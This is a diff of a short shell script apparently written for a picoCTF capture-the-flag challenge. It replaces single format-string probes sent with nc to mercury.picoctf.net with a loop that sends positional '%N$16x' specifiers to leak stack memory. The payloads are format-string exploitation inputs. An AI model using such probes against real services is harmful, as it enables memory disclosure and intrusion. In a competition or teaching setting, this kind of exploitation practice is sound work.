@@ -1,6 +1,9 @@
 #/bin/sh
 
-nc mercury.picoctf.net 33411 < inputs.txt
-echo "1%8$p" | nc mercury.picoctf.net 33411
-echo "1%8$x" | nc mercury.picoctf.net 33411
-echo "1%128s" | nc mercury.picoctf.net 33411
+# for i in {1..50};
+# do
+#     (echo 1; echo "%${i}\$08x") | nc mercury.picoctf.net 33411
+# done | less
+
+
+(echo 1; for i in {1..50}; do echo -n "%${i}\$16x"; done; echo) | nc mercury.picoctf.net 33411
